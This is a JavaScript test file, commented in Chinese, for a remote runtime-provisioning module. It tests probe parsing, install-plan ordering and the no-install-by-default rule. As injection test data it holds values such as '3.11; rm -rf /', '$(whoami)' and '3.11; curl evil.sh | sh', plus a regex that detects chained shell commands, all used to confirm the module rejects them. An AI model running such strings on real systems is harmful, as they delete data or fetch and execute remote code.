// 契约 §3.8 + task-3：src/engine/provision/{probe,plans,ensure}.js
// 全部用**注入的假执行器**模拟远端，绝不联网。
// 覆盖：探测输出解析（多发行版样本）、方案优先级、默认 allowInstall=false 不安装且返回 suggestion、
//       全失败 ok:false、版本/包名白名单、命令以 argv 传递（契约 §5.1）
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { suiteFor, requiredFn } from './helpers/modules.mjs';
import { sampleServer } from './helpers/fixtures.mjs';

const relProbe = 'src/engine/provision/probe.js';
const relPlans = 'src/engine/provision/plans.js';
const relEnsure = 'src/engine/provision/ensure.js';

const probeSuite = await suiteFor(relProbe);
const plansSuite = await suiteFor(relPlans);
const ensureSuite = await suiteFor(relEnsure);

// ───────────────────────── probe 解析 ─────────────────────────
describe('provision/probe', { skip: probeSuite.skip }, () => {
  const probe = probeSuite.mod;

  /** 造一段符合 ##dsh## 分段协议的探测输出 */
  function sectioned({ osRelease, uname, shell, workdir, sudo, tools, osPm }) {
    return [
      '##dsh##os_release', ...(osRelease ?? []), '',
      '##dsh##uname', ...(uname ?? []), '',
      '##dsh##shell', ...(shell ?? []),
      '##dsh##workdir', ...(workdir ?? []),
      '##dsh##sudo', ...(sudo ?? []),
      '##dsh##tools', ...(tools ?? []),
      '##dsh##os_pm', ...(osPm ?? []),
      '##dsh##end',
    ].join('\n');
  }

  const DISTROS = [
    {
      name: 'Ubuntu',
      input: { osRelease: ['NAME="Ubuntu"', 'VERSION_ID="22.04"', 'ID=ubuntu', 'ID_LIKE=debian', 'PRETTY_NAME="Ubuntu 22.04.3 LTS"'], uname: ['Linux', 'x86_64', '5.15.0', 'h'], shell: ['/bin/bash', '/bin/bash'], workdir: ['/srv/app', '/home/u'], sudo: ['passwordless'], tools: ['python3|/usr/bin/python3|Python 3.11.4'], osPm: ['/usr/bin/apt-get', 'apt-get'] },
      expectOs: /ubuntu/i,
      expectArch: /x86_64|amd64/,
      expectManager: /apt/,
    },
    {
      name: 'Debian',
      input: { osRelease: ['NAME="Debian GNU/Linux"', 'VERSION_ID="12"', 'ID=debian', 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"'], uname: ['Linux', 'aarch64', '6.1.0', 'h'], shell: ['/bin/sh', '/bin/sh'], workdir: ['/root', '/root'], sudo: ['root'], tools: ['node|/usr/bin/node|v18.19.0'], osPm: ['/usr/bin/apt', 'apt'] },
      expectOs: /debian/i,
      expectArch: /aarch64|arm64/,
      expectManager: /apt/,
    },
    {
      name: 'CentOS/RHEL',
      input: { osRelease: ['NAME="CentOS Stream"', 'VERSION_ID="9"', 'ID="centos"', 'ID_LIKE="rhel fedora"', 'PRETTY_NAME="CentOS Stream 9"'], uname: ['Linux', 'x86_64', '5.14.0', 'h'], shell: ['/bin/bash', '/bin/bash'], workdir: ['/home/app', '/home/app'], sudo: ['password'], tools: ['python|/usr/bin/python|Python 3.9.18'], osPm: ['/usr/bin/dnf', 'dnf'] },
      expectOs: /centos/i,
      expectManager: /dnf|yum/,
    },
    {
      name: 'Alpine',
      input: { osRelease: ['NAME="Alpine Linux"', 'VERSION_ID="3.19"', 'ID=alpine', 'PRETTY_NAME="Alpine Linux v3.19"'], uname: ['Linux', 'x86_64', '6.6.0', 'h'], shell: ['/bin/ash', '/bin/ash'], workdir: ['/app', '/root'], sudo: ['none'], tools: [], osPm: ['/sbin/apk', 'apk'] },
      expectOs: /alpine/i,
      expectManager: /apk/,
    },
    {
      name: 'macOS',
      input: { osRelease: [], uname: ['Darwin', 'arm64', '23.1.0', 'Mac'], shell: ['/bin/zsh', '/bin/zsh'], workdir: ['/Users/app', '/Users/app'], sudo: ['passwordless'], tools: ['node|/opt/homebrew/bin/node|v21.5.0'], osPm: ['/opt/homebrew/bin/brew', 'brew'] },
      expectOs: /darwin|mac/i,
      expectArch: /arm64/,
      expectManager: /brew/,
    },
  ];

  for (const d of DISTROS) {
    test(`解析 ${d.name} 探测输出（os/arch/managers）`, () => {
      const { probe: p } = probe.composeProbe(sectioned(d.input), { exitCode: 0 });
      assert.match(p.os, d.expectOs, `${d.name}: os 识别错误，实际 ${p.os}`);
      if (d.expectArch) assert.match(p.arch, d.expectArch, `${d.name}: arch 识别错误，实际 ${p.arch}`);
      if (d.expectManager) {
        assert.ok(
          p.managers.some((m) => d.expectManager.test(m)),
          `${d.name}: managers 应含包管理器，实际 ${JSON.stringify(p.managers)}`,
        );
      }
      assert.ok(p.at > 0, 'at 必须被填充');
      assert.equal(typeof p.error, 'string', 'error 必须是字符串');
    });
  }

  test('probe 对象形状严格符合契约 §2.3', () => {
    const { probe: p } = probe.composeProbe(sectioned(DISTROS[0].input), { exitCode: 0 });
    for (const k of ['at', 'os', 'arch', 'shell', 'workdir', 'runtime', 'managers', 'sudo', 'error']) {
      assert.ok(k in p, `probe 必须含契约字段 ${k}`);
    }
    assert.ok(probe.isValidProbeShape(p), 'isValidProbeShape 应认可自己产出的 probe');
    assert.deepEqual(probe.PROBE_KEYS, ['at', 'os', 'arch', 'shell', 'workdir', 'runtime', 'managers', 'sudo', 'error']);
  });

  test('emptyProbe 带 error 且形状合法', () => {
    const p = probe.emptyProbe('连接超时');
    assert.equal(p.error, '连接超时');
    assert.ok(probe.isValidProbeShape(p));
    assert.deepEqual(p.runtime, {});
    assert.deepEqual(p.managers, []);
  });

  test('解析 runtime 版本（python/node）并给出路径', () => {
    const { probe: p, paths } = probe.composeProbe(
      sectioned({
        ...DISTROS[0].input,
        tools: ['python3|/usr/bin/python3|Python 3.11.4', 'node|/usr/local/bin/node|v20.10.0'],
      }),
      { exitCode: 0 },
    );
    const pyVersion = p.runtime.python ?? p.runtime.python3 ?? '';
    assert.ok(pyVersion.includes('3.11'), `python 版本解析错误：${JSON.stringify(p.runtime)}`);
    assert.ok(String(p.runtime.node).includes('20'), `node 版本解析错误：${JSON.stringify(p.runtime)}`);
    assert.equal(paths.python3, '/usr/bin/python3', '应给出解释器路径');
    assert.equal(paths.node, '/usr/local/bin/node');
  });

  test('parseOsRelease 处理引号、注释与转义', () => {
    const out = probe.parseOsRelease('# comment\nNAME="Ubuntu"\nID=ubuntu\nEMPTY=\nQUOTED=\'x y\'\nESCAPED="a\\"b"');
    assert.equal(out.NAME, 'Ubuntu', '应去掉引号');
    assert.equal(out.ID, 'ubuntu');
    assert.equal(out.EMPTY, '');
    assert.equal(out.QUOTED, 'x y');
    assert.equal(out.ESCAPED, 'a"b', '应处理转义引号');
  });

  test('未识别/空输出不崩，返回带 error 或空字段的 probe', () => {
    const r = probe.composeProbe('', { exitCode: 1, stderr: 'boom' });
    assert.ok(r.probe, '必须返回 probe 对象');
    assert.equal(typeof r.probe.error, 'string');
  });

  test('buildProbeScript 只包含固定命令（不含用户输入）', () => {
    const script = probe.buildProbeScript();
    assert.ok(script.includes('##dsh##'), '应使用分段标记');
    assert.ok(!/\$\{?\w*(user|input|param)/i.test(script), '探测脚本不得拼接用户输入');
  });
});

// ───────────────────────── plans 优先级与安全 ─────────────────────────
describe('provision/plans', { skip: plansSuite.skip }, () => {
  const plans = plansSuite.mod;

  /** 收集方案里所有 argv（方案结构是 {steps:[{argv}]}） */
  const allArgvs = (list) => list.flatMap((p) => (p.steps ?? []).map((s) => s.argv));

  test('Python 方案：已装 uv 时首选 uv → pyenv → 发行版包', () => {
    const withUv = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get', 'uv'] } });
    const order = withUv.map((p) => p.id).join(',');
    assert.match(order, /uv/, `已装 uv 时应提供 uv 方案，实际 ${order}`);

    const withBoth = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get', 'uv', 'pyenv'] } });
    const ids = withBoth.map((p) => p.id);
    const uvIdx = ids.findIndex((i) => i.startsWith('uv:'));
    const pyenvIdx = ids.findIndex((i) => i.startsWith('pyenv:'));
    const pkgIdx = ids.findIndex((i) => i.startsWith('distro:'));
    assert.ok(uvIdx >= 0 && pyenvIdx >= 0 && pkgIdx >= 0, `三种方案都应给出，实际 ${ids.join(',')}`);
    assert.ok(uvIdx < pyenvIdx, `uv 必须先于 pyenv，实际 ${ids.join(',')}`);
    assert.ok(pyenvIdx < pkgIdx, `pyenv 必须先于发行版包，实际 ${ids.join(',')}`);
  });

  test('Python 方案：未装 uv/pyenv 时退回发行版包（不编造不可用方案）', () => {
    const list = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get'] } });
    assert.ok(list.length > 0, '应给出发行版包方案');
    assert.ok(list.every((p) => p.kind === 'package'), `只应有 package 方案，实际 ${JSON.stringify(list.map((p) => p.kind))}`);
    assert.ok(list.some((p) => p.id.includes('python')), `包名应含 python，实际 ${JSON.stringify(list.map((p) => p.id))}`);
  });

  test('Node 方案：已装 nvm 时首选 nvm；否则退回系统包管理器', () => {
    const withNvm = plans.nodeInstallPlans({ version: '20', probe: { managers: ['apt-get', 'nvm'] } });
    const ids = withNvm.map((p) => p.id);
    assert.ok(ids.some((i) => i.startsWith('nvm:')), `应提供 nvm 方案，实际 ${ids.join(',')}`);
    const nvmIdx = ids.findIndex((i) => i.startsWith('nvm:'));
    const sysIdx = ids.findIndex((i) => i.startsWith('distro:') || i.startsWith('pkg:'));
    if (sysIdx >= 0) assert.ok(nvmIdx < sysIdx, `nvm 必须先于系统包，实际 ${ids.join(',')}`);

    const withNone = plans.nodeInstallPlans({ version: '20', probe: { managers: ['apt-get'] } });
    assert.ok(withNone.length > 0, '无版本管理器时应有系统方案');
    assert.ok(withNone.every((p) => p.kind === 'package' || p.requiresConfig), '只应有包方案或需显式开启的方案');
  });

  test('所有方案命令都是 argv 数组（契约 §5.1，绝不拼 shell 字符串）', () => {
    const lists = [
      plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get', 'uv', 'pyenv'] } }),
      plans.nodeInstallPlans({ version: '20', probe: { managers: ['apt-get', 'nvm', 'fnm', 'mise'] } }),
      plans.packageInstallPlans({ packages: ['git', 'curl'], probe: { managers: ['apt-get'] } }),
    ];
    for (const list of lists) {
      assert.ok(list.length > 0, '方案列表不应为空');
      for (const p of list) {
        assert.ok(Array.isArray(p.steps) && p.steps.length > 0, `方案 ${p.id} 必须有 steps`);
        for (const s of p.steps) {
          assert.ok(Array.isArray(s.argv), `方案 ${p.id} 的 step 必须是 argv 数组，实际 ${JSON.stringify(s.argv)}`);
          assert.ok(s.argv.every((a) => typeof a === 'string'), `方案 ${p.id} 的 argv 每项必须是字符串`);
          // argv 里不得出现 shell 拼接痕迹（用户的版本号应作为独立元素）
          assert.ok(!s.argv.some((a) => /;\s*(rm|curl|wget|sh)\b/.test(a)), `argv 不得含拼接的命令，实际 ${JSON.stringify(s.argv)}`);
        }
      }
    }
  });

  test('版本号白名单：注入字符串被拒绝', () => {
    for (const bad of ['3.11; rm -rf /', '3.11 && curl evil', '$(whoami)', '3.11\nrm', 'latest', '']) {
      assert.throws(() => plans.assertVersionSpec(bad), /.*/, `版本号 ${JSON.stringify(bad)} 必须被拒绝`);
    }
    for (const good of ['3', '3.11', '3.11.9', '20', '20.11.1']) {
      assert.equal(plans.assertVersionSpec(good), good, `合法版本号 ${good} 应通过`);
    }
  });

  test('包名白名单：注入字符串被拒绝', () => {
    for (const bad of ['git; rm -rf /', '$(whoami)', 'a b', '--flag', '']) {
      assert.throws(() => plans.assertPackageName(bad), /.*/, `包名 ${JSON.stringify(bad)} 必须被拒绝`);
    }
    for (const good of ['git', 'python3-dev', 'libssl1.1', 'g++', 'nodejs']) {
      assert.equal(plans.assertPackageName(good), good, `合法包名 ${good} 应通过`);
    }
  });

  test('whichArgv 用位置参数传名字（不拼接进脚本）', () => {
    const argv = plans.whichArgv('uv');
    assert.ok(Array.isArray(argv));
    assert.ok(argv.includes('uv'), '工具名必须作为独立 argv 元素');
    const script = argv.find((a) => a.includes('command -v'));
    assert.ok(script.includes('$1'), `脚本应通过 $1 取参数，实际 ${script}`);
    assert.ok(!script.includes(' uv'), '脚本里不得写死工具名');
  });

  test('pickPackageManager 按 probe 选管理器，无管理器时返回空', () => {
    const picked = plans.pickPackageManager({ managers: ['apt-get', 'apk'] });
    assert.equal(picked?.manager?.cmd, 'apt-get', `应优先 apt-get，实际 ${JSON.stringify(picked)}`);
    assert.ok(plans.pickPackageManager({ managers: ['apk'] })?.manager, 'apk 应可用');
    const none = plans.pickPackageManager({ managers: [] });
    assert.ok(!none?.manager, `没有管理器时应无 manager，实际 ${JSON.stringify(none)}`);
  });

  test('buildSuggestion 输出可照做的命令（按 {label, plans} 形状传入）', () => {
    const list = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get'] } });
    const suggestion = plans.buildSuggestion({
      missing: [{ key: 'python', label: 'Python 3.11', plans: list }],
      probe: { os: 'Ubuntu 22.04', arch: 'x86_64', managers: ['apt-get'], sudo: 'passwordless' },
      server: { id: 'prod-01', name: '生产机' },
    });
    assert.equal(typeof suggestion, 'string', 'suggestion 必须是字符串');
    assert.ok(suggestion.includes('Python 3.11'), `应点名缺少的组件，实际 ${suggestion.slice(0, 200)}`);
    assert.ok(/apt-get install/.test(suggestion), `应给出可直接执行的命令，实际 ${suggestion.slice(0, 400)}`);
    assert.ok(!suggestion.includes('undefined'), `suggestion 不得出现 undefined（说明缺字段未填），实际 ${suggestion}`);
  });

  test('describeMissing 产出稳定结构（label + 命令文本）', () => {
    const list = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get'] } });
    const d = plans.describeMissing([{ key: 'python', label: 'Python 3.11', plans: list }]);
    assert.ok(Array.isArray(d) && d.length === 1);
    assert.equal(d[0].key, 'python');
    assert.equal(d[0].label, 'Python 3.11');
    assert.ok(Array.isArray(d[0].plans), 'plans 必须是数组');
    assert.ok(d[0].plans.every((p) => Array.isArray(p.steps)), 'steps 应为字符串数组（命令展示文本）');
  });

  test('高危的远程安装脚本默认不出现（需显式开启）', () => {
    const list = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get'] } });
    assert.ok(!list.some((p) => p.highRisk), '默认不得给出 highRisk 方案');
    const withFlag = plans.pythonInstallPlans({ version: '3.11', probe: { managers: ['apt-get'] }, config: { allowRemoteInstallerScripts: true } });
    const risky = withFlag.filter((p) => p.highRisk);
    assert.ok(risky.length > 0, '显式开启后应提供（并标记 highRisk）');
    assert.ok(risky.every((p) => p.highRisk === true), '高危方案必须被明确标记');
  });
});

// ───────────────────────── ensure 行为 ─────────────────────────
describe('provision/ensure', { skip: ensureSuite.skip }, () => {
  const ensureMod = ensureSuite.mod;
  const createProvisioner = requiredFn(ensureMod, 'createProvisioner', relEnsure);

  /**
   * 造一个假执行器：按命令内容返回可控输出（不触网、不执行真实命令）。
   *
   * 注意：`provisioner.probe()` 并不调用 executor.probe()，而是通过 exec 执行
   * `buildProbeScript()` 并解析输出（ensure.js:410）。因此假执行器必须能响应
   * **探测脚本**，否则 managers/runtime 全为空、方案列表也为空。
   */
  function makeFakeExecutor(plan = {}) {
    const ran = [];
    const probeStdout = makeProbeOutput(plan);
    return {
      id: 'local',
      kind: 'local',
      ran,
      phase: 'queued',
      async probe() {
        return {
          at: Date.now(), os: plan.os ?? 'Ubuntu 22.04', arch: 'x86_64', shell: '/bin/bash', workdir: '/srv/app',
          runtime: plan.runtime ?? {}, managers: plan.managers ?? ['apt-get'], sudo: plan.sudo ?? 'passwordless', error: '',
        };
      },
      async run(spec) {
        const argv = spec.argv ?? [];
        const line = argv.join(' ');
        ran.push(line);
        let stdout = '';
        let exitCode = 1;

        if (plan.failAll) {
          spec.onData?.({ text: 'command failed\n', stream: 'stderr' });
          return { done: Promise.resolve({ exitCode: 1, signal: null }), cancel() {}, phase: 'running' };
        }

        // 1) 探测脚本（分段标记）
        if (line.includes('##dsh##')) {
          stdout = probeStdout;
          exitCode = 0;
        } else if (line.includes('command -v')) {
          // 2) command -v <name>
          const name = argv[argv.length - 1];
          if ((plan.available ?? []).includes(name)) {
            stdout = `/usr/local/bin/${name}\n`;
            exitCode = 0;
          }
        } else if (/test -x/.test(line) || /--version/.test(line)) {
          // 3) 解释器探测 / 版本查询
          const m = line.match(/(python3|python|node|uv|pyenv|nvm|fnm|mise|git)/);
          const which = m?.[1] ?? 'python';
          stdout = plan.versions?.[which] ?? '';
          exitCode = stdout ? 0 : 1;
        } else if (plan.installSucceeds !== false) {
          // 4) 安装类命令：默认成功
          stdout = 'ok\n';
          exitCode = 0;
        }

        if (stdout) spec.onData?.({ text: stdout, stream: 'stdout' });
        return { done: Promise.resolve({ exitCode, signal: null }), cancel() {}, phase: 'running' };
      },
      async readDir() { return []; },
      async stat() { return { exists: false, isDir: false, size: 0, mtime: 0 }; },
      async match() { return { matched: [], ignored: [], truncated: false, total: 0, patterns: [] }; },
      async transferIn() {},
      async transferOut() {},
      async dispose() {},
    };
  }

  /** 按 ##dsh## 分段协议造探测输出（等价于远端执行 buildProbeScript 的结果） */
  function makeProbeOutput(plan = {}) {
    const managers = plan.managers ?? ['apt-get'];
    const available = plan.available ?? [];
    const tools = (plan.tools ?? []).map((t) => `${t.name}|${t.path}|${t.version}`);
    return [
      '##dsh##os_release',
      'NAME="Ubuntu"',
      'VERSION_ID="22.04"',
      'ID=ubuntu',
      'ID_LIKE=debian',
      'PRETTY_NAME="Ubuntu 22.04.3 LTS"',
      '',
      '##dsh##uname',
      'Linux', 'x86_64', '5.15.0', 'host',
      '##dsh##shell', '/bin/bash', '/bin/bash',
      '##dsh##workdir', '/srv/app', '/home/deploy',
      '##dsh##sudo', plan.sudo ?? 'passwordless',
      '##dsh##tools',
      ...tools,
      '##dsh##os_pm',
      ...managers.map((m) => `/usr/bin/${m}`),
      ...managers,
      '##dsh##end',
      '',
    ].join('\n');
  }

  const provisionerWith = (executor, extra = {}) =>
    createProvisioner({
      log: () => {},
      config: {},
      resolveExecutor: () => executor,
      getServer: () => sampleServer(),
      probeTtlMs: 0,
      ...extra,
    });

  test('createProvisioner 返回 { ensure, probe }', () => {
    const p = provisionerWith(makeFakeExecutor());
    assert.equal(typeof p.ensure, 'function', 'ensure 必须是函数');
    assert.equal(typeof p.probe, 'function', 'probe 必须是函数');
  });

  test('probe 返回 probe 形状', async () => {
    const provisioner = provisionerWith(makeFakeExecutor());
    const result = await provisioner.probe(sampleServer());
    assert.ok(result && typeof result === 'object', 'probe 必须返回对象');
    for (const k of ['os', 'arch', 'shell', 'workdir', 'runtime', 'managers', 'sudo']) {
      assert.ok(k in result, `probe 结果必须含 ${k}`);
    }
  });

  test('★ 默认 allowInstall=false：缺失时不安装，返回 ok:false + suggestion', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { python: '3.11' }, {});
    assert.equal(r.ok, false, `不允许安装时缺失必须 ok:false，实际 ${JSON.stringify(r)}`);
    assert.ok(r.suggestion, '必须给出 suggestion（可照做的说明）');
    assert.equal(typeof r.suggestion, 'string', 'suggestion 必须是字符串');
    const installed = ex.ran.filter((l) => /apt-get\s+install|uv\s+python\s+install|pyenv\s+install|apk\s+add/.test(l));
    assert.deepEqual(installed, [], `allowInstall=false 时绝不能执行安装命令，实际跑了 ${JSON.stringify(installed)}`);
    assert.ok(Array.isArray(r.actions ?? []), 'actions 必须是数组（契约 §3.8）');
    const mutating = (r.actions ?? []).filter((a) => /install|add|upgrade/.test(String(a.command ?? '')));
    assert.deepEqual(mutating, [], `不得有实际安装动作，实际 ${JSON.stringify(mutating)}`);
  });

  test('★ allowInstall=true 时才尝试安装，并给出 resolved/actions 或明确失败', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { python: '3.11' }, { allowInstall: true, onLog: () => {} });
    assert.ok(r && typeof r === 'object', '必须返回结果对象');
    if (r.ok) {
      assert.ok(r.resolved, 'ok:true 必须带 resolved');
      assert.ok(Array.isArray(r.actions), 'ok:true 必须带 actions');
    } else {
      assert.ok(r.error, 'ok:false 必须带 error');
      assert.ok(r.suggestion, 'ok:false 必须带 suggestion');
    }
    assert.ok(
      ex.ran.some((l) => /install/.test(l)),
      `allowInstall=true 时应尝试安装，实际跑了 ${JSON.stringify(ex.ran)}`,
    );
  });

  test('版本不匹配（请求 3.12 但只有 3.11）不得被判为满足', async () => {
    const ex = makeFakeExecutor({
      available: ['python3'],
      versions: { python3: 'Python 3.11.4', python: 'Python 3.11.4' },
      runtime: { python: '3.11.4' },
    });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { python: '3.12' }, {});
    assert.equal(r.ok, false, `请求 3.12 而远端只有 3.11 时不得报成功，实际 ${JSON.stringify(r)}`);
    assert.ok(r.suggestion || r.error, '必须说明缺什么');
  });

  test('versionMatches 语义：3.11 匹配 3.11.9，不匹配 3.1 / 3.111', () => {
    const vm = ensureMod.versionMatches;
    assert.equal(vm('3.11.9', '3.11'), true);
    assert.equal(vm('3.11', '3.11'), true);
    assert.equal(vm('3.1', '3.11'), false);
    assert.equal(vm('3.111', '3.11'), false);
    assert.equal(vm('20.10.0', '20'), true);
    assert.equal(vm('18.19.0', '20'), false);
    assert.equal(vm('3.11.4', ''), true, '空版本表示任意');
    assert.equal(vm('3.11.4', 'any'), true);
  });

  test('全失败（所有命令都失败）返回 ok:false 而不是抛异常', async () => {
    const ex = makeFakeExecutor({ failAll: true });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { python: '3.11' }, { allowInstall: true });
    assert.equal(r.ok, false, `全失败必须 ok:false，实际 ${JSON.stringify(r)}`);
    assert.ok(r.error, '必须给出 error');
  });

  test('requirement 中的包依赖（packages）也被处理', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { packages: ['git', 'curl'] }, {});
    assert.equal(typeof r.ok, 'boolean');
    if (!r.ok) assert.ok(r.suggestion || r.error, '缺包时必须给出建议');
  });

  test('注入非法版本号不得进入命令行（安全）', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    let threw = false;
    let r;
    try {
      r = await provisioner.ensure(sampleServer(), { python: '3.11; curl evil.sh | sh' }, { allowInstall: true });
    } catch {
      threw = true;
    }
    assert.ok(threw || r?.ok === false, '非法版本号必须被拒绝（抛错或 ok:false）');
    const injected = ex.ran.filter((l) => l.includes('evil.sh'));
    assert.deepEqual(injected, [], `注入内容绝不能进入执行的命令，实际 ${JSON.stringify(injected)}`);
  });

  test('onLog 回调收到供给过程的命令（前端要显示「这个运行时是怎么来的」）', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    const logs = [];
    await provisioner.ensure(sampleServer(), { python: '3.11' }, { onLog: (text, stream) => logs.push({ text, stream }) });
    assert.ok(logs.length > 0, 'onLog 必须被调用');
    assert.ok(logs.every((l) => typeof l.text === 'string'), 'onLog 的 text 必须是字符串');
  });

  test('ensure 不接受 allowInstall 之外的隐式安装：显式 false 同样不安装', async () => {
    const ex = makeFakeExecutor({ available: [], managers: ['apt-get'] });
    const provisioner = provisionerWith(ex);
    const r = await provisioner.ensure(sampleServer(), { node: '20' }, { allowInstall: false });
    assert.equal(r.ok, false);
    assert.ok(!ex.ran.some((l) => /install/.test(l)), `显式 false 时不得安装，实际 ${JSON.stringify(ex.ran)}`);
  });
});
